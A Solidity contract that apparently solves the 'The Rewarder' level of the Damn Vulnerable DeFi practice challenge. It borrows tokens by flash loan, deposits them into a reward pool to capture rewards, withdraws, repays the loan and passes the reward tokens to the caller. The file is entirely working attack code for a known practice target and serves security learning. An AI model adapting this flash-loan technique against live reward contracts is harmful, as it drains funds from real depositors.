pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract RewarderFlashAttacker {
    TheRewarderPool immutable rewarderPool;
    FlashLoanerPool immutable loanerPool;
    DamnValuableToken immutable liquidityToken;
    IERC20 immutable rewardToken;

    constructor(
        address _rewarderPool,
        address _loanerPool,
        address _liquidityToken,
        address _rewardToken
    ) {
        rewarderPool = TheRewarderPool(_rewarderPool);
        loanerPool = FlashLoanerPool(_loanerPool);
        liquidityToken = DamnValuableToken(_liquidityToken);
        rewardToken = IERC20(_rewardToken);
    }

    function getFlashLoan(uint amount) external {
        // Get flash loan
        FlashLoanerPool(loanerPool).flashLoan(amount);
    }

    function receiveFlashLoan(uint amount) external {
        // Deposit
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        // Withdraw
        rewarderPool.withdraw(amount);
        // Return funds
        liquidityToken.transfer(address(loanerPool), amount);
    }

    function distributeRewards() external {
        rewarderPool.distributeRewards();
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }
}
